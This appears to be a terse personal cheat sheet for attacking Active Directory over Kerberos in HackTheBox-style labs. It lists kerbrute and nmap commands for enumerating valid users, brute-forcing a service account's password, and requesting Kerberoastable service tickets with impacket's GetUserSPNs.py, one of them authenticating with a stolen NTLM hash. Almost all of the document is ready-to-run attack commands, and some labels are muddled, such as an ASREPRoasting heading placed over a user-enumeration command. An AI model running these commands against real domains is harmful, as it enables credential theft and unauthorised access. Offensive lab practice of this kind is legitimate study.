ldapsearh (find user principal name and service name) --> valid users via kerbrute / or nmap (for keberoasting)


**verify vaild users**

```sh
kerbrute --dc 10.10.10.161 -d htb.local userenum validuser-list
```
**verify valid user via nmap**
```sh
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='joshi.local',userdb=/home/hello/ad/username.txt only-usernames.txt <IP>
```



**finding password hash via service user**
`got service user name via ASREPRoasting`

```sh
 kerbrute --dc 10.10.10.161 -d htb.local userenum sname.txt
```


**verify password**
```sh
kerbrute bruteuser --dc 10.10.10.100 -d active.htb password.txt SVC_TGS
```

**downgrade hash**

```sh
kerbrute --dc 10.10.10.161 -d htb.local userenum sname.txt --downgrade
```
## kerberoasting command

you need id and password for any account on the machine to perform this attack

`via hash`

```sh
GetUserSPNs.py -request -dc-ip 10.10.11.168 -hashes :5F38C0485F0C23F8DEDF9BF23FFA5336 scrm.local/ksimpson
```
`via ip`
```sh
 GetUserSPNs.py -request -dc-ip 10.10.11.168 -k scrm.local/ksimpson
```
`via host`

```sh
GetUserSPNs.py -request -dc-host dc1.scrm.local -k scrm.local/ksimpson
```
